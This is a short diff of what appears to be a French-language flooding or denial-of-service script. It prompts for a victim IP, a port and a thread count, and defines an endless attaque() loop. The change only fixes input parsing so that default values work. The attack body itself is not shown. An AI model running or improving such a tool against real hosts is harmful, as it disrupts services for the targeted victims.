@@ -26,8 +26,8 @@ print("")
 print("")
 
 target = input('\033[92m' + "[?] Entrez l'IP de la victime: ")
-port = int(input('\033[92m' + "[?] Entrez un port: "))
-threads = int(input('\033[92m' + "[?] Entrez le nombre de threads à amorcer (342 par exemple): "))
+port = input('\033[92m' + "[?] Entrez un port: ")
+threads = input('\033[92m' + "[?] Entrez le nombre de threads à amorcer (342 par exemple): ")
 compteur = 0
 banned = 0
 
@@ -36,6 +36,9 @@ if threads == '':
 
 if port == '':
     port = 80
+
+port = int(port)
+threads = int(threads)
 
 def attaque():
     while True:
